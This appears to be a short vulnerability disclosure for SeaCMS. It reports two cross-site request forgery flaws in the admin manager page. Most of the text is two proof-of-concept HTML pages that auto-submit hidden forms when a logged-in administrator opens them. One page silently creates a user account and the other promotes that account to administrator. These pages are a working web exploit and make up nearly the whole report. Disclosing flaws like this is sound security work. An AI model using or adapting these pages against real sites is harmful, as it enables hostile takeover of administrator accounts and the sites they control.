### There is two CSRF vulnerability that can add the administrator account.

After the administrator logged in, open the following two page
poc：
one.html---add a user
```
<html><body>
<script type="text/javascript">
function post(url,fields)
{
var p = document.createElement("form");
p.action = url;
p.innerHTML = fields;
p.target = "_self";
p.method = "post";
document.body.appendChild(p);
p.submit();
}
function csrf_hack()
{
var fields;

fields += "<input type='hidden' name='username' value='aaaaaaa' />";
fields += "<input type='hidden' name='pwd' value='aaaaaa' />";  
fields += "<input type='hidden' name='pwd2' value='aaaaaa' />";  
fields += "<input type='hidden' name='groupid' value='2' />";  


var url = "http://127.0.0.1/seacms/adm1n/admin_manager.php?action=add";
post(url,fields);
}
window.onload = function() { csrf_hack();}
</script>
</body></html>

```

two.html---add a admin

```
<html><body>
<script type="text/javascript">
function post(url,fields)
{
var p = document.createElement("form");
p.action = url;
p.innerHTML = fields;
p.target = "_self";
p.method = "post";
document.body.appendChild(p);
p.submit();
}
function csrf_hack()
{
var fields;

fields += "<input type='hidden' name='username' value='aaaaaaa' />";
fields += "<input type='hidden' name='pwd' value='aaaaaaa' />";  
fields += "<input type='hidden' name='pwd2' value='aaaaaaa' />";  
fields += "<input type='hidden' name='groupid' value='1' />";  
fields += "<input type='hidden' name='state' value='1' />";  
fields += "<input type='hidden' name='v_eidtsubmit' value='%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98' />";  
 

var url = "http://127.0.0.1/seacms/adm1n/admin_manager.php?action=save&id=2";
post(url,fields);
}
window.onload = function() { csrf_hack();}
</script>
</body></html>
```